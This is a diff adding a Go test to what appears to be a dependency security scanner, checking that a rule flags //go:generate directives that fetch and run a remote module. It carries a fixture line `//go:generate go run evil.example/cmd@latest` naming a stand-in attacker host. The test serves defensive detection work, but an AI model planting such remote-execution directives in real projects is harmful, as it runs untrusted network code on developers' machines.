@@ -292,3 +292,32 @@ func TestGoConstrainedInitEvasionFires(t *testing.T) {
 		t.Errorf("an ordinary platform init must fire no VC-002 finding; got %v", c)
 	}
 }
+
+// A //go:generate that runs a REMOTE module (`go run <mod>@<version>`) fetches and
+// executes it — the npx analog — and reaches the network (VC-002b), end-to-end
+// through the gomod adapter; a local `go run ./gen` generator stays silent.
+func TestGoGenerateRemoteRunnerFires(t *testing.T) {
+	dir := t.TempDir()
+	write(t, filepath.Join(dir, "go.mod"), "module evil.example/m\n\ngo 1.21\n")
+	write(t, filepath.Join(dir, "gen.go"),
+		"package m\n\n//go:generate go run evil.example/cmd@latest\n")
+	g := rootedGraph("gomod", "evil.example/m", "v0.0.0")
+	if err := gomod.New().ExtractInstallSurface(dir, g); err != nil {
+		t.Fatalf("extract: %v", err)
+	}
+	if c := runVC002(g); c["VC-002b"] < 1 {
+		t.Errorf("a //go:generate go run <remote>@<version> must reach the network (VC-002b); got %v", c)
+	}
+
+	dir2 := t.TempDir()
+	write(t, filepath.Join(dir2, "go.mod"), "module honest.example/m\n\ngo 1.21\n")
+	write(t, filepath.Join(dir2, "gen.go"),
+		"package m\n\n//go:generate go run ./internal/gen\n")
+	g2 := rootedGraph("gomod", "honest.example/m", "v0.0.0")
+	if err := gomod.New().ExtractInstallSurface(dir2, g2); err != nil {
+		t.Fatalf("extract: %v", err)
+	}
+	if c := runVC002(g2); len(c) != 0 {
+		t.Errorf("a local `go run ./gen` generator must fire no VC-002 finding; got %v", c)
+	}
+}
